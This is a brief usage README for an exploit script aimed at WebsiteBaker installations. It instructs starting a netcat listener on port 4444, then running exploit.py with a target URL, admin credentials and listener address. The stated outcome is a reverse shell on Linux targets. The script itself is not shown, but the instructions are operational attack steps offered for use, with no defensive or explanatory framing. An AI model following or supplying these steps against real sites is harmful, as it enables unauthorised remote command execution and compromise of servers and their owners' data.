
First Start Listener With Netcat : nc -lvnp 4444

Then Use Exploit

Usage: python exploit.py -t TARGET_URL -u USERNAME -p PASSWORD --lhost LISTENER_IP --lport LISTENER_PORT

Example: python exploit.py -t http://192.168.1.104/WebsiteBaker -u admin -p admin --lhost 192.168.1.103 --lport 4444


#Notes:

Authentication is Required to Exploit Vulnerability

Exploit is For Linux Targets!
